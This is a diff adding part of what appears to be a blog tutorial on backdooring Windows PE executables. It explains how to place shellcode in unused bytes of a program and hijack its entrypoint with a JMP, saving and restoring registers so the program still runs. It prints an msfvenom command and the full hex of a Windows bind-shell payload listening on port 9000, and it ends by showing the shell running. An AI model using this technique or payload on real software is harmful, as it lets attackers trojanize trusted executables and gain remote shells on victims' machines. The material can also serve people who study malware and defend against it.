@@ -68,3 +68,70 @@ As we are unable to use a the addition of a PE Header and a Code Cave, we are le
 ![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/2.png)
 
 It isn't quite much, perhaps among 500 bytes, but it sure is enough to fit our payload and execute it. Sadly, encoding is not available in such scenarios, as the section is too privileged for certain encoding characters which are obligatory.
+
+Let's check the entrypoint, as such addresses will be later on restored as explained on the previous posts.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/3.png)
+
+We see a CALL towards 00D68396. As we need to restore this function later on, if we simply replace it with a JMP, we may not have the address to restore due to ASLR. For such reasons, I will perform this step at the ending, placing the PUSHAD/PUSHFD + shellcode + alignment + POPFD/POPAD + restore first and the replace the entrypoint at last.
+
+For this scenario, I will use address 00D7DE67.
+
+Placing PUSHAD/PUSHFD.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/4.png)
+
+Generating shellcode.
+
+```term
+root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 328 bytes
+Final size of hex file: 656 bytes
+fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
+root@whitecr0wz:~# 
+```
+
+Pasting the shellcode.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/5.png)
+
+Performing additional modifications to the shellcode.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/6.png)
+
+Placing the alignment.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/7.png)
+
+Inserting the POPFD/POPAD instructions.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/8.png)
+
+Restoring the CALL instruction.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/9.png)
+
+Now, we could simply replace the CALL instruction without any issue.
+
+Assembling the JMP towards the following address of the entrypoint.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/10.png)
+
+This is then saved.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/11.png)
+
+Replacing the entrypoint for a JMP instruction towards our unused bytes.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/12.png)
+
+This is then saved.
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/13.png)
+
+If this is run, we may see how the shellcode is executed as intended without any complication!
+
+![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/14.gif)
